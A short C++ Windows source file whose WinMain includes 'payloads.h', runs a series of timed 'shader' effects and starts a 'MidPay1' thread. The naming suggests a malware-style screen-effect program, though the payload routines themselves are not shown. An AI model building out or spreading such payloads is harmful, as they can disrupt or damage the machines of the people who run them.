#include "payloads.h"

INT WINAPI __stdcall WinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPSTR lpCmdLine,
	_In_ int nShowCmd
) {
	ShaderLoader(PreSha1, 350);
	CreateThread(0, 0, LPTHREAD_START_ROUTINE(MidPay1), 0, 0, 0);
	ShaderLoader(Shad1, 250);
	ShaderLoader(Shad2, 200);
	ShaderLoader(Shad3, 500);
	ShaderLoader(Shad4, 250);
}
